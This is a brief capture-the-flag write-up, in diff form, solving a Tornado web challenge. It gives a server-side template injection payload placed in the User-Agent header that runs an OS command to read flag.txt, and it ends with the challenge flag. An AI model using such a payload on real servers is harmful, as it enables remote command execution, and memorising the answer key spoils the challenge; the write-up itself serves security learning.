@@ -1,0 +1,7 @@
+Looking at html code, I see: <meta name="frameworks" content="Tornado">
+If I lookup on google: Tornado + exploit, I can find this webpage:
+https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/
+And then finally injecting this in user-agent:
+a {%raw __import__('os').popen('cat flag.txt').read()%}
+
+flag is: ECW{969282787ee00745e21802ca4bf4473b}
